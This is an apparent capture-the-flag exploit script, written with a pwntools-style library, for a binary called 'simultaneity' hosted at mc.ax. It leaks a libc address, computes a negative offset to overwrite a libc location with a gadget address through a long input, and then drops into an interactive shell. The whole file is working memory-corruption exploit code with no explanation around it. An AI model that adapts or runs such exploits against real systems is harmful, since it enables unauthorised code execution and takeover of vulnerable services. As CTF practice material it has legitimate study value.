#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./simultaneity')

host = args.HOST or 'mc.ax'
port = int(args.PORT or 31547)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+211
continue
continue
'''.format(**locals())

# -- Exploit goes here --
libc = ELF("./libc.so.6")
io = start()
sla("how big?\n", str(0x100000))
reu("you are here: ")
leak = int(rl().strip(b"\n"), 16)
libc.address = leak + 0x122ff0
log.info(f"leak : {hex(leak)}")
log.info(f"libc base : {hex(libc.address)}")
print(hex(libc.sym['__free_hook']))

target = libc.address + 0x19b8e8
offset = ( leak  -  target ) // 8

value = libc.sym['system']
log.info ( 'offset: {}, value: {}' . format ( offset , value ))

# sla("how far?\n", str(libc.sym['__free_hook']//8))
sla("how far?\n", str(int(-offset)))
kek = str(libc.sym.system) + str(int(value))*0x1337
# sla("what?\n", str(libc.sym.system) + str(int(value))*0x1337)
sla("what?\n", "41"*0x1337 + str(libc.address + 0x228a3))
# sla("what?\n", "F"*0x1337)
io.interactive()